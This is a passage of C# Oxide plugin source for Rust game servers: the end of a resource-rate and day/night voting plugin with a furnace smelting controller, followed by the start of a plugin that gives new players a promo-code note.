            [JsonProperty("Добываемые ресурсы")]
            public float gather;

            [JsonProperty("Сульфур")]
            public float sulfur;

            [JsonProperty("С карьера")]
            public float carier;

            [JsonProperty("С ящиков/бочек")]
            public float box;

            [JsonProperty("Запертый ящик")]
            public float lockbox;

            [JsonProperty("С ученых")]
            public float npc;

            [JsonProperty("Скорость переплавки")]
            public float speed;
        }

        class daynight
        {
            [JsonProperty("Включить?")]
            public bool enable;

            [JsonProperty("Длина ночи")]
            public float night;

            [JsonProperty("Длина дня")]
            public float day;

            [JsonProperty("Автопропуск ночи")]
            public bool skipnight;

            [JsonProperty("Голосование за пропуск ночи")]
            public bool vote;

            [JsonProperty("Ночное увелечение рейтов (прим. 1.0 - на 100%, 0 - выключить)")]
            public float upnight;
        }

        private class PluginConfig
        {
            [JsonProperty("Экспериментально. Не трогать!")]
            public bool exp;

            [JsonProperty("Рейты у обычных игроков")]
            public rateset rates;

            [JsonProperty("Настройка дня и ночи")]
            public daynight daynight;

            [JsonProperty("Сообщения")]
            public List<string> messages;

            [JsonProperty("Привилегии")]
            public Dictionary<string, rateset> privilige;

            [JsonProperty("На что не увеличивать рейты?")]
            public string[] blacklist;

            public static PluginConfig DefaultConfig()
            {
                return new PluginConfig()
                {
                    privilige = new Dictionary<string, rateset>()
                    {
                        { "xrate.x3", new rateset{ box = 3f, carier = 3f, gather = 3f, grab = 3f, npc = 3f, speed = 4f, sulfur = 2.5f } },
                        { "xrate.x4", new rateset{ box = 4f, carier = 4f, gather = 4f, grab = 4f, npc = 4f, speed = 4f, sulfur = 2.5f } }
                    },
                    rates = new rateset { box = 2f, carier = 2f, gather = 2f, grab = 2f, npc = 2f, speed = 2f, sulfur = 2f },
                    daynight = new daynight
                    {
                        day = 50f,
                        night = 10f,
                        enable = true,
                        skipnight = false,
                        upnight = 0f,
                        vote = false
                    },
                    exp = false,
                    messages = new List<string>
                    {
                        "<size=15><color=#ccff33>Наступила ночь</color>, рейты добычи увеличены на <color=#ccff33>{num}%</color>!</size>\n<size=10><color=#ccff33>/rate</color> - узнать текущие ваши рейты.</size>",
                        "<size=15><color=#ccff33>Наступил день</color>, рейты добычи стали прежними!</size>\n<size=10><color=#ccff33>/rate</color> - узнать текущие ваши рейты.</size>",
                        "<color=#ccff33>INFORATE | {name}</color>\nПоднимаемые: x<color=#F0E68C>{0}</color>\nДобываемые: x<color=#F0E68C>{1}</color> <size=10>(cульфур: x<color=#F0E68C>{6}</color>)</size>\nКарьер: x<color=#F0E68C>{2}</color>\nЯщики/бочки: x<color=#F0E68C>{3}</color>\nNPC: x<color=#F0E68C>{4}</color>\nСкорость переплавки: x<color=#F0E68C>{5}</color>"
                    },
                    blacklist = new string[]
                    {
                        "sticks",
                        "flare"
                    }
                };
            }
        }
        #endregion

        #region getrate
        Dictionary<string, rateset> cash = new Dictionary<string, rateset>();
        Dictionary<ulong, float> cashcariers = new Dictionary<ulong, float>();
        static XRate ins;
        void Init()
        {
            ins = this;
        }

        bool skip;
        bool isday;
        void OnHour()
        {
            if (TOD_Sky.Instance.Cycle.Hour > TOD_Sky.Instance.SunriseTime && TOD_Sky.Instance.Cycle.Hour <= 19f && !isday) OnSunrise();
            else if ((TOD_Sky.Instance.Cycle.Hour >= 19f || TOD_Sky.Instance.Cycle.Hour < TOD_Sky.Instance.SunriseTime) && isday) OnSunset();
        }

        void OnSunrise()
        {
            TOD_Sky.Instance.Components.Time.DayLengthInMinutes = daytime;
            isday = true;
            if (upnight > 1f)
            {
                Server.Broadcast(config.messages[1]);
                nightupdate();
            }
        }

        #region ГОЛОСОВАНИЕ
        const string REFRESHGUI = "[{\"name\":\"daytext\",\"parent\":\"day\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"{day}\",\"fontSize\":18,\"align\":\"MiddleCenter\",\"color\":\"1 1 1 0.7921728\",\"fadeIn\":0.5},{\"type\":\"UnityEngine.UI.Outline\",\"color\":\"0 0 0 0.392941\",\"distance\":\"0.5 0.5\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0\",\"anchormax\":\"1 1\",\"offsetmax\":\"0 0\"}]},{\"name\":\"neighttext\",\"parent\":\"night\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"{night}\",\"fontSize\":18,\"align\":\"MiddleCenter\",\"color\":\"1 1 1 0.7921569\",\"fadeIn\":0.5},{\"type\":\"UnityEngine.UI.Outline\",\"color\":\"0 0 0 0.3948711\",\"distance\":\"0.5 0.5\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0\",\"anchormax\":\"1 1\",\"offsetmax\":\"0 0\"}]}]";
        const string GUI = "[{\"name\":\"Main\",\"parent\":\"Overlay\",\"components\":[{\"type\":\"UnityEngine.UI.Image\",\"color\":\"0 0 0 0.2035446\",\"fadeIn\":0.5},{\"type\":\"RectTransform\",\"anchormin\":\"0.5 1\",\"anchormax\":\"0.5 1\",\"offsetmin\":\"-100 -65\",\"offsetmax\":\"100 -35\"}]},{\"name\":\"day\",\"parent\":\"Main\",\"components\":[{\"type\":\"UnityEngine.UI.Button\",\"command\":\"chat.say /voteday\",\"color\":\"1 1 1 0.3929416\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0\",\"anchormax\":\"0.5 1\",\"offsetmax\":\"0 0\"}]},{\"name\":\"daytext\",\"parent\":\"day\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"{day}\",\"fontSize\":18,\"align\":\"MiddleCenter\",\"color\":\"1 1 1 0.7921728\",\"fadeIn\":0.5},{\"type\":\"UnityEngine.UI.Outline\",\"color\":\"0 0 0 0.392941\",\"distance\":\"0.5 0.5\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0\",\"anchormax\":\"1 1\",\"offsetmax\":\"0 0\"}]},{\"name\":\"night\",\"parent\":\"Main\",\"components\":[{\"type\":\"UnityEngine.UI.Button\",\"command\":\"chat.say /votenight\",\"color\":\"0 0 0 0.3929408\"},{\"type\":\"RectTransform\",\"anchormin\":\"0.5 0\",\"anchormax\":\"1 1\",\"offsetmax\":\"0 0\"}]},{\"name\":\"neighttext\",\"parent\":\"night\",\"components\":[{\"type\":\"UnityEngine.UI.Text\",\"text\":\"{night}\",\"fontSize\":18,\"align\":\"MiddleCenter\",\"color\":\"1 1 1 0.7921569\",\"fadeIn\":0.5},{\"type\":\"UnityEngine.UI.Outline\",\"color\":\"0 0 0 0.3948711\",\"distance\":\"0.5 0.5\"},{\"type\":\"RectTransform\",\"anchormin\":\"0 0\",\"anchormax\":\"1 1\",\"offsetmax\":\"0 0\"}]}]";
        static string CONSTVOTE = "";

        void CLEARVOTE()
        {
            Vtimer?.Destroy();
            Vday = 0;
            Vnight = 0;
            voted.Clear();
        }

        void StartVote()
        {
            activevote = true;
            CLEARVOTE();
            Debug.LogWarning("-Голосование за пропуск ночи-");
            Server.Broadcast("<color=yellow>Начато голосование за пропуск ночи. Нажмите на ДЕНЬ или НОЧЬ или пропишите в чат /voteday - за день или /votenight - за ночь.</color>");
            CommunityEntity.ServerInstance.ClientRPCEx(new Network.SendInfo { connections = Network.Net.sv.connections }, null, "DestroyUI", "Main");
            CommunityEntity.ServerInstance.ClientRPCEx(new Network.SendInfo { connections = Network.Net.sv.connections }, null, "AddUI", CONSTVOTE);
            Vtimer = timer.Once(30f, () => EndVote());
        }

        void EndVote()
        {
            activevote = false;
            if (Vday > Vnight)
            {
                TOD_Sky.Instance.Cycle.Hour += (24 - TOD_Sky.Instance.Cycle.Hour) + TOD_Sky.Instance.SunriseTime;
                OnSunrise();
                Server.Broadcast("<color=yellow>Большинство проголосовало за день. Пропускаем ночь...</color>");
                Debug.LogWarning("-Пропускаем ночь-");
            }
            else
            {
                Debug.LogWarning("-Ночь остается-");
                Server.Broadcast("<color=yellow>— Да будет свет! — сказал электрик и перерезал провода.</color>");
            }
            CLEARVOTE();
            CommunityEntity.ServerInstance.ClientRPCEx(new Network.SendInfo { connections = Network.Net.sv.connections }, null, "DestroyUI", "Main");
        }

        Timer Vtimer;
        bool activevote;
        static int Vday;
        static int Vnight;
        static List<ulong> voted = new List<ulong>();

        private void REFRESHME()
        {
            List<Network.Connection> sendto = Network.Net.sv.connections.Where(x => voted.Contains(x.userid)).ToList();
            string RGUI = REFRESHGUI.Replace("{day}", Vday.ToString()).Replace("{night}", Vnight.ToString());
            CommunityEntity.ServerInstance.ClientRPCEx(new Network.SendInfo { connections = sendto }, null, "DestroyUI", "daytext");
            CommunityEntity.ServerInstance.ClientRPCEx(new Network.SendInfo { connections = sendto }, null, "DestroyUI", "neighttext");
            CommunityEntity.ServerInstance.ClientRPCEx(new Network.SendInfo { connections = sendto }, null, "AddUI", RGUI);
        }

        private void cmdvoteday(BasePlayer player, string command, string[] args)
        {
            if (!CHECKPOINT(player)) return;

            player.ChatMessage("<color=yellow>Голос за ДЕНЬ успешно принят.</color>");
            Vday++;
            voted.Add(player.userID);
            REFRESHME();
            if (Vday > BasePlayer.activePlayerList.Count * 0.6f) EndVote();
        }

        private void cmdvotenight(BasePlayer player, string command, string[] args)
        {
            if (!CHECKPOINT(player)) return;

            player.ChatMessage("<color=yellow>Голос за НОЧЬ успешно принят.</color>");
            Vnight++;
            voted.Add(player.userID);
            REFRESHME();
            if (Vnight > BasePlayer.activePlayerList.Count * 0.6f) EndVote();
        }

        bool CHECKPOINT(BasePlayer player)
        {
            if (!activevote)
            {
                player.ChatMessage("<color=yellow>ГОЛОСОВАНИЕ НЕ АКТИВНО!</color>");
                return false;
            }

            if (voted.Contains(player.userID))
            {
                player.ChatMessage("<color=yellow>ВЫ УЖЕ ГОЛОСОВАЛИ!</color>");
                return false;
            }

            return true;
        }
        #endregion

        void OnSunset()
        {
            if (skip) return;
            if (config.daynight.skipnight)
            {
                Env.time = 23.99f;
                skip = true;
                timer.Once(8f, () =>
                {
                    Env.time = TOD_Sky.Instance.SunriseTime;
                    skip = false;
                });
                Debug.Log("Пропускаем ночь.");
                return;
            }
            else if (config.daynight.vote) StartVote();

            TOD_Sky.Instance.Components.Time.DayLengthInMinutes = nighttime;
            isday = false;
            if (upnight > 1f)
            {
                Server.Broadcast(config.messages[0].Replace("{num}", (config.daynight.upnight * 100f).ToString()));
                nightupdate();
            }
        }

        void nightupdate()
        {
            if (cash.Count > 0) foreach (var id in cash.ToList()) getuserrate(id.Key);
            if (cashcariers.Count > 0) foreach (var id in cashcariers.ToList()) CashCarier(id.Key);
        }

        float daytime;
        float nighttime;
        float upnight;
        TOD_Time comp;
        void OnServerInitialized()
        {
            if(config.blacklist == null || config.blacklist.Length == 0)
            {
                config.blacklist = new string[]
                {
                    "sticks",
                    "flare"
                };
                SaveConfig();
            }

            if(config.daynight == null)
            {
                config.daynight = new daynight
                {
                    day = 50f,
                    night = 10f,
                    enable = true,
                    skipnight = false,
                    upnight = 0f,
                    vote = false
                };
                SaveConfig();
            }

            if (config.rates.lockbox == 0f)
            {
                config.rates.lockbox = config.rates.box;
                foreach (var x in config.privilige) x.Value.lockbox = x.Value.box;
                SaveConfig();
            }

            if (config.daynight.enable)
            {
                if (config.daynight.vote)
                {
                    CONSTVOTE = GUI.Replace("{day}", "ДЕНЬ").Replace("{night}", "НОЧЬ");
                    Interface.Oxide.GetLibrary<ru.Libraries.Command>(null).AddChatCommand("voteday", this, "cmdvoteday");
                    Interface.Oxide.GetLibrary<ru.Libraries.Command>(null).AddChatCommand("votenight", this, "cmdvotenight");
                }
                daytime = config.daynight.day * 24f / (19f - TOD_Sky.Instance.SunriseTime);
                nighttime = config.daynight.night * 24f / (24f - (19f - TOD_Sky.Instance.SunriseTime));
                upnight = 1f + config.daynight.upnight;
                comp = TOD_Sky.Instance.Components.Time;
                comp.ProgressTime = true;
                comp.UseTimeCurve = false;
                comp.OnSunrise += OnSunrise;
                comp.OnSunset += OnSunset;
                comp.OnHour += OnHour;

                if (TOD_Sky.Instance.Cycle.Hour > TOD_Sky.Instance.SunriseTime && TOD_Sky.Instance.Cycle.Hour <= 19f) OnSunrise();
                else OnSunset();
            }

            var ovens = UnityEngine.Object.FindObjectsOfType<BaseOven>();
            for (var i = 0; i < ovens.Length; i++)
            {
                OnEntitySpawned(ovens[i]);
            }
            timer.Once(1f, () =>
            {
                foreach (BaseOven oven in ovens)
                {
                    var component = oven.GetComponent<FurnaceController>();
                    if (oven == null || oven.IsDestroyed || !oven.IsOn()) continue;
                    component.StartCooking();
                }
            });
            foreach (string perm in config.privilige.Keys) permission.RegisterPermission(perm, this);
            foreach (BasePlayer player in BasePlayer.activePlayerList) getuserrate(player.UserIDString);
        }

        void OnGroupPermissionGranted(string name, string perm)
        {
            foreach (BasePlayer player in BasePlayer.allPlayerList)
            {
                if (permission.UserHasGroup(player.UserIDString, name)) getuserrate(player.UserIDString);
            }
        }

        void OnGroupPermissionRevoked(string name, string perm)
        {
            foreach (BasePlayer player in BasePlayer.allPlayerList)
            {
                if (permission.UserHasGroup(player.UserIDString, name)) getuserrate(player.UserIDString);
            }
        }

        void OnUserGroupRemoved(string id, string groupName)
        {
            getuserrate(id);
        }

        void OnUserGroupAdded(string id, string groupName)
        {
            getuserrate(id);
        }

        void OnUserPermissionGranted(string id, string permName)
        {
            getuserrate(id);
        }

        void OnUserPermissionRevoked(string id, string permName)
        {
            getuserrate(id);
        }

        void OnPlayerConnected(BasePlayer player)
        {
            getuserrate(player.UserIDString);
        }

        void OnPlayerDisconnected(BasePlayer player, string reason)
        {
            if (cash.ContainsKey(player.UserIDString)) cash.Remove(player.UserIDString);
        }
        #endregion

        #region Rates
        [ChatCommand("rate")]
        private void cmdRATE(BasePlayer player, string command, string[] args)
        {
            player.ChatMessage(config.messages[2].Replace("{name}", player.displayName).Replace("{0}", cash[player.UserIDString].grab.ToString()).Replace("{1}", cash[player.UserIDString].gather.ToString()).Replace("{2}", cash[player.UserIDString].carier.ToString()).Replace("{3}", cash[player.UserIDString].box.ToString()).Replace("{4}", cash[player.UserIDString].npc.ToString()).Replace("{5}", cash[player.UserIDString].speed.ToString()).Replace("{6}", cash[player.UserIDString].sulfur.ToString()));
        }

        [PluginReference] private Plugin ZREWARDME;

        void getuserrate(string id, float bonus = 0f)
        {
            rateset rate = config.privilige.LastOrDefault(x => permission.UserHasPermission(id, x.Key)).Value ?? config.rates;
            if (!cash.ContainsKey(id)) cash[id] = new rateset();
            if (ZREWARDME != null && bonus == 0f) bonus = ZREWARDME.Call<float>("APIBONUS", id);
            if (upnight > 1f && !isday)
            {
                cash[id].box = rate.box * upnight;
                cash[id].carier = rate.carier * upnight;
                cash[id].gather = rate.gather * upnight;
                cash[id].grab = rate.grab * upnight;
                cash[id].lockbox = rate.lockbox * upnight;
                cash[id].npc = rate.npc * upnight;
                cash[id].sulfur = rate.sulfur * upnight;
            }
            else
            {
                cash[id].box = rate.box;
                cash[id].carier = rate.carier;
                cash[id].gather = rate.gather;
                cash[id].grab = rate.grab;
                cash[id].lockbox = rate.lockbox;
                cash[id].npc = rate.npc;
                cash[id].sulfur = rate.sulfur;
            }

            if(bonus > 0f)
            {
                cash[id].gather += bonus;
                cash[id].grab += bonus;
                cash[id].sulfur += bonus;
            }

            cash[id].speed = rate.speed;
        }

        void OnCollectiblePickup(Item item, BasePlayer player)
        {
            if (config.blacklist.Contains(item.info.shortname)) return;
            item.amount = (int)(item.amount * cash[player.UserIDString].grab);
        }

        void OnGrowableGather(GrowableEntity plant, Item item, BasePlayer player)
        {
            if (player == null || item == null) return;
            if (config.blacklist.Contains(item.info.shortname)) return;
            item.amount = (int)(item.amount * cash[player.UserIDString].grab);
        }

        void OnDispenserBonus(ResourceDispenser dispenser, BasePlayer player, Item item)
        {
            if (config.blacklist.Contains(item.info.shortname)) return;
            if (item.info.itemid.Equals(-1157596551)) item.amount = (int)(item.amount * cash[player.UserIDString].sulfur);
            else item.amount = (int)(item.amount * cash[player.UserIDString].gather);
        }

        void OnDispenserGather(ResourceDispenser dispenser, BaseEntity entity, Item item)
        {
            if (config.blacklist.Contains(item.info.shortname)) return;
            BasePlayer player = entity.ToPlayer();
            if (player != null)
            {
                if (item.info.itemid.Equals(-1157596551)) item.amount = (int)(item.amount * cash[player.UserIDString].sulfur);
                else item.amount = (int)(item.amount * cash[player.UserIDString].gather);
            }
            else
            {
                if (item.info.itemid.Equals(-1157596551)) item.amount *= (int)(item.amount * config.rates.sulfur);
                else item.amount *= (int)(item.amount * config.rates.gather);
            }
        }

        private void CashCarier(ulong id)
        {
            rateset rate = config.privilige.LastOrDefault(x => permission.UserHasPermission(id.ToString(), x.Key)).Value ?? config.rates;
            if (!isday && upnight > 1f) cashcariers[id] = rate.carier * upnight;
            else cashcariers[id] = rate.carier;
        }

        private object OnExcavatorGather(ExcavatorArm arm, Item item)
        {
            if (config.blacklist.Contains(item.info.shortname)) return null;
            item.amount = (int)(item.amount * config.rates.carier);
            return null;
        }

        private void OnQuarryToggled(BaseEntity entity, BasePlayer player)
        {
            CashCarier(entity.OwnerID);
        }

        void OnQuarryGather(MiningQuarry quarry, Item item)
        {
            if (config.blacklist.Contains(item.info.shortname)) return;
            float rate;
            if (!cashcariers.TryGetValue(quarry.OwnerID, out rate))
            {
                CashCarier(quarry.OwnerID);
                rate = cashcariers[quarry.OwnerID];
            }
            item.amount = (int)(item.amount * rate);
        }
        /*
        object OnQuarryGather(MiningQuarry quarry, List<ResourceDepositManager.ResourceDeposit.ResourceDepositEntry> itemList)
        {
            if (!cashcariers.ContainsKey(quarry.OwnerID)) CashCarier(quarry.OwnerID);
            foreach (ResourceDepositManager.ResourceDeposit.ResourceDepositEntry resource in itemList)
            {
                if ((quarry.canExtractLiquid || !resource.isLiquid) && (quarry.canExtractSolid || resource.isLiquid))
                {
                    resource.workDone += quarry.workToAdd;
                    if ((double)resource.workDone >= (double)resource.workNeeded)
                    {
                        int iAmount = Mathf.FloorToInt(resource.workDone / resource.workNeeded);
                        resource.workDone -= (float)iAmount * resource.workNeeded;
                        Item obj = ItemManager.Create(resource.type, (int)(iAmount * cashcariers[quarry.OwnerID]), 0UL);
                        if (!obj.MoveToContainer(quarry.hopperPrefab.instance.GetComponent<StorageContainer>().inventory, -1, true))
                        {
                            obj.Remove(0.0f);
                            quarry.SetOn(false);
                        }
                    }
                }
            }
            if (!quarry.FuelCheck()) quarry.SetOn(false);
            return false;
        }*/

        void OnContainerDropItems(ItemContainer container)
        {
            LootContainer lootcont = container.entityOwner as LootContainer;
            if (lootcont == null || lootcont.OwnerID != 0) return;
            var player = lootcont?.lastAttacker?.ToPlayer();
            if (lootcont.HasFlag(BaseEntity.Flags.Reserved7) || lootcont.HasFlag(BaseEntity.Flags.Reserved8)) return;
            
            if (player != null && cash.ContainsKey(player.UserIDString))
            {
                foreach (var item in lootcont.inventory.itemList)
                {
                    int maxstack = item.MaxStackable();
                    if (maxstack  == 1 || config.blacklist.Contains(item.info.shortname) || item.IsBlueprint()) continue;
                    item.amount = (int)(item.amount * cash[player.UserIDString].box);
                    if (item.amount > maxstack) item.amount = maxstack;
                }
            }
            else
            {
                foreach (var item in lootcont.inventory.itemList.Where(x => x.info.stackable > 1))
                {
                    int maxstack = item.MaxStackable();
                    if (maxstack == 1 || config.blacklist.Contains(item.info.shortname) || item.IsBlueprint()) continue;
                    item.amount = (int)(item.amount * config.rates.box);
                    if (item.amount > maxstack) item.amount = maxstack;
                }
            }
        }

        private void OnEntityDeath(BaseNetworkable entity, HitInfo info)
        {
            if (entity is BaseHelicopter && config.exp)
            {
                HackableLockedCrate ent = (HackableLockedCrate)GameManager.server.CreateEntity("assets/prefabs/deployable/chinooklockedcrate/codelockedhackablecrate.prefab", entity.transform.position, entity.transform.rotation);
                ent.Spawn();
            }
        }

        private void OnLootEntity(BasePlayer player, BaseEntity entity)
        {
            if (player == null || entity == null) return;
            if (entity is NPCPlayerCorpse)
            {
                if (entity.HasFlag(BaseEntity.Flags.Reserved7) || entity.HasFlag(BaseEntity.Flags.Reserved8)) return;
                ItemContainer cont = entity.GetComponent<NPCPlayerCorpse>().containers.FirstOrDefault();
                foreach (var item in cont.itemList.Where(x => x.info.stackable > 1))
                {
                    int maxstack = item.MaxStackable();
                    if (maxstack == 1 || config.blacklist.Contains(item.info.shortname) || item.IsBlueprint()) continue;
                    item.amount = (int)(item.amount * cash[player.UserIDString].npc);
                    if (item.amount > maxstack) item.amount = maxstack;
                }
                entity.SetFlag(BaseEntity.Flags.Reserved7, true);
            }
            else if (entity is LootContainer)
            {
                LootContainer lootcont = entity.GetComponent<LootContainer>();
                if (lootcont == null || lootcont.HasFlag(BaseEntity.Flags.Reserved7) || lootcont.HasFlag(BaseEntity.Flags.Reserved8)) return;
                if (entity is HackableLockedCrate)
                {
                    foreach (var item in lootcont.inventory.itemList.Where(x => x.info.stackable > 1))
                    {
                        int maxstack = item.MaxStackable();
                        if (maxstack == 1 || config.blacklist.Contains(item.info.shortname) || item.IsBlueprint()) continue;
                        item.amount = (int)(item.amount * cash[player.UserIDString].lockbox);
                        if (item.amount > maxstack) item.amount = maxstack;
                    }
                }
                else
                {
                    foreach (var item in lootcont.inventory.itemList.Where(x => x.info.stackable > 1))
                    {
                        int maxstack = item.MaxStackable();
                        if (maxstack == 1 || config.blacklist.Contains(item.info.shortname) || item.IsBlueprint()) continue;
                        item.amount = (int)(item.amount * cash[player.UserIDString].box);
                        if (item.amount > maxstack) item.amount = maxstack;
                    }
                }
                lootcont.SetFlag(BaseEntity.Flags.Reserved7, true);
            }
        }
        #endregion

        #region Smelt
        private void Unload()
        {

            if (comp != null)
            {
                comp.OnSunrise -= OnSunrise;
                comp.OnSunset -= OnSunset;
                comp.OnHour -= OnHour;
            }
            if (config.daynight.vote) CommunityEntity.ServerInstance.ClientRPCEx(new Network.SendInfo { connections = Network.Net.sv.connections }, null, "DestroyUI", "Main");
            
            var ovens = UnityEngine.Object.FindObjectsOfType<BaseOven>();

            foreach (BaseOven oven in ovens)
            {
                var component = oven.GetComponent<FurnaceController>();
                if (oven.IsOn())
                {
                    component.StopCooking();
                    oven.StartCooking();
                }
                UnityEngine.Object.Destroy(component);
            }
        }

        private void OnEntitySpawned(BaseNetworkable entity)
        {
            if (entity == null) return;
            else if (entity is BaseOven) entity?.gameObject?.AddComponent<FurnaceController>();
        }

        private object OnOvenToggle(StorageContainer oven, BasePlayer player)
        {
            if (oven is BaseFuelLightSource) return null;
            FurnaceController component = oven.GetComponent<FurnaceController>();
            if (component == null) component = oven.gameObject.AddComponent<FurnaceController>();
            if (oven.IsOn())
            {
                component.StopCooking();
            }
            else
            {
                component.StartCooking();
                component.SetSpeed(cash[player.UserIDString].speed);
            }
            return false;
        }

        public class FurnaceController : FacepunchBehaviour
        {
            private BaseOven _oven;
            private BaseOven Furnace
            {
                get
                {
                    if (_oven == null) _oven = GetComponent<BaseOven>();
                    return _oven;
                }
            }
            private float _speedMultiplier;
            private int amountmultiplier;
            private int amount;

            private void Awake()
            {
                SetSpeed(ins.config.rates.speed);
                amount = amountmultiplier;
            }

            public void SetSpeed(float newspeed)
            {
                _speedMultiplier = newspeed;
                amountmultiplier = (int)newspeed;
            }

            private Item FindBurnable()
            {
                if (Furnace.inventory == null) return null;

                foreach (var item in Furnace.inventory.itemList)
                {
                    var component = item.info.GetComponent<ItemModBurnable>();
                    if (component && (Furnace.fuelType == null || item.info == Furnace.fuelType))
                    {
                        return item;
                    }
                }

                return null;
            }

            public void Cook()
            {
                var item = FindBurnable();
                if (item == null)
                {
                    StopCooking();
                    return;
                }

                SmeltItems();
                var slot = Furnace.GetSlot(BaseEntity.Slot.FireMod);
                if (slot) slot.SendMessage("Cook", 0.5f, SendMessageOptions.DontRequireReceiver);

                var component = item.info.GetComponent<ItemModBurnable>();
                item.fuel -= 5f;
                if (!item.HasFlag(global::Item.Flag.OnFire))
                {
                    item.SetFlag(global::Item.Flag.OnFire, true);
                    item.MarkDirty();
                }

                if (item.fuel <= 0f) ConsumeFuel(item, component);
            }

            private void ConsumeFuel(Item fuel, ItemModBurnable burnable)
            {
                if (Furnace.allowByproductCreation && burnable.byproductItem != null && Random.Range(0f, 1f) > burnable.byproductChance)
                {
                    var def = burnable.byproductItem;
                    var item = ItemManager.Create(def, burnable.byproductAmount * amountmultiplier);
                    if (!item.MoveToContainer(Furnace.inventory))
                    {
                        StopCooking();
                        item.Drop(Furnace.inventory.dropPosition, Furnace.inventory.dropVelocity);
                    }
                }
                amount = amountmultiplier;
                if (fuel.amount <= amountmultiplier)
                {
                    fuel.Remove();
                    return;
                }
                fuel.amount -= amountmultiplier;
                fuel.fuel = burnable.fuelAmount;
                fuel.MarkDirty();
            }
            private Dictionary<Item, float> cook = new Dictionary<Item, float>();
            private void SmeltItems()
            {
                for (var i = 0; i < Furnace.inventory.itemList.Count; i++)
                {
                    var item = Furnace.inventory.itemList[i];
                    if (item == null || !item.IsValid()) continue;

                    var cookable = item.info.GetComponent<ItemModCookable>();
                    if (cookable == null) continue;

                    var temperature = item.temperature;
                    if ((temperature < cookable.lowTemp || temperature > cookable.highTemp))
                    {
                        if (!cookable.setCookingFlag || !item.HasFlag(global::Item.Flag.Cooking)) continue;
                        item.SetFlag(global::Item.Flag.Cooking, false);
                        item.MarkDirty();
                        continue;
                    }
                    if (cook.ContainsKey(item)) cook[item] += 0.5f;
                    else cook[item] = 0.5f;
                    if (cook[item] < (cookable.cookTime / _speedMultiplier)) continue;
                    cook[item] = 0f;
                    if (cookable.setCookingFlag && !item.HasFlag(global::Item.Flag.Cooking))
                    {
                        item.SetFlag(global::Item.Flag.Cooking, true);
                        item.MarkDirty();
                    }
                    int position = item.position;
                    int amount2 = item.amount;
                    if (amount2 > amount)
                    {
                        item.amount -= amount;
                        item.MarkDirty();
                    }
                    else
                    {
                        item.Remove();
                    }

                    if (cookable.becomeOnCooked == null) continue;
                    int newamount = cookable.amountOfBecome * amount;
                    var item2 = ItemManager.Create(cookable.becomeOnCooked, amount2 < newamount ? amount2 : newamount);

                    if (item2 == null || item2.MoveToContainer(item.parent, position) || item2.MoveToContainer(item.parent)) continue;
                    item2.Drop(item.parent.dropPosition, item.parent.dropVelocity);
                    if (!item.parent.entityOwner) continue;
                    StopCooking();
                }
            }

            public void StartCooking()
            {
                if (FindBurnable() == null) return;

                StopCooking();

                Furnace.inventory.temperature = Furnace.cookingTemperature;
                Furnace.UpdateAttachmentTemperature();

                Furnace.InvokeRepeating(Cook, 0.5f, 0.5f);
                Furnace.SetFlag(BaseEntity.Flags.On, true);
            }

            public void StopCooking()
            {
                cook.Clear();
                Furnace.CancelInvoke(Cook);
                Furnace.StopCooking();
            }
        }
        #endregion
    }
}

// --- End of file: XRate.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/HudRust/TextPromo.cs ---
// --- Original Local Path: HudRust/TextPromo.cs ---

﻿using System;
using System.Collections.Generic;
using System.Globalization;
using System.Linq;
using System.Numerics;
using System.Security.Cryptography.X509Certificates;
using ConVar;
using Facepunch.Extend;
using Newtonsoft.Json;
using Newtonsoft.Json.Serialization;
using Oxide.Core;
using Oxide.Core.Plugins;
using Oxide.Game.Rust.Cui;
using UnityEngine;
using Random = UnityEngine.Random;
namespace Oxide.Plugins
{
    [Info("TextPromo", "TopPlugin.ru", "1.0.0")]
    public class TextPromo : RustPlugin
    {
        public class ConfigData
        {
            [JsonProperty("Адресс магазина")] public string nameserver;
            [JsonProperty("Первый промо")] public string promo1;
            [JsonProperty("Второй промо")] public string promo2;
            [JsonProperty("Сколько игроков получит промо")] public int count;
            public static ConfigData GetNewConf()
            {
                ConfigData newConfig = new ConfigData();
                newConfig.nameserver = "RUST PINK";
                newConfig.promo1 = "wipe (25RUB)";
                newConfig.promo2 = "MAGAZIN - rustpink.ru ";
                newConfig.count = 50;
                return newConfig;
            }
        }
        protected override void LoadDefaultConfig() => cfg = ConfigData.GetNewConf();
        protected override void SaveConfig() => Config.WriteObject(cfg);

        protected override void LoadConfig()
        {
            base.LoadConfig();
            try
            {
                cfg = Config.ReadObject<ConfigData>();
            }
            catch
            {
                LoadDefaultConfig();
            }

            NextTick(SaveConfig);
        }
        private ConfigData cfg { get; set;}
        public List<TextPromos> TextPromo2 = new List<TextPromos>();

        [ChatCommand("givepromonote")]
        void cmdgive(BasePlayer player)
        {
            if (player.IsAdmin)
            {
                GivePromo(player);
            }
        }
        public class TextPromos
        {
            [JsonProperty("Ник")] public string Name { get; set; }
            [JsonProperty("СтимАйди")] public ulong SteamID { get; set; }
            [JsonProperty("Выдал")] public bool Vidal { get; set; }
        }
        void OnPlayerInit(BasePlayer player)
        {
            TextPromos data = TextPromo2.Find(x => x.SteamID == player.userID);
            if((player is NPCPlayer)) return;
            if (TextPromo2.Count >= cfg.count)
            {
                return;
            }
            if (player.IsAdmin)
            {
                return;
            }
            if (data == null)
            {
                data = new TextPromos()
                {
                    Name = player.displayName,
                    SteamID = player.userID,
                    Vidal = false,
                };
                TextPromo2.Add(data);
                return;
            }

            if (data.Vidal)
            {
                return;
            }
            if (data != null)
            {
                GivePromo(player);
                SendReply(player, "Вы зашли на вайп сервера, вы получили промо-код в записке.");
                data.Vidal = true;
                SaveData();
            }
        }
        void OnPlayerSleepEnded(BasePlayer player)
        {
            OnPlayerInit(player);
        }
        void GivePromo(BasePlayer player)
        {
            Item it = ItemManager.CreateByName("note", 1);
            it.name = "PROMO";
            it.skin = 1923090978;
            it.text = $"{cfg.nameserver}\n\nPROMO:\n{cfg.promo1}\n{cfg.promo2}\n\n{cfg.nameserver}";
            if (!player.inventory.GiveItem(it))
            {
                it.Drop(player.inventory.containerMain.dropPosition,
                    player.inventory.containerMain.dropVelocity,
                    new Quaternion());
            }
        }
        void SaveData()
        {
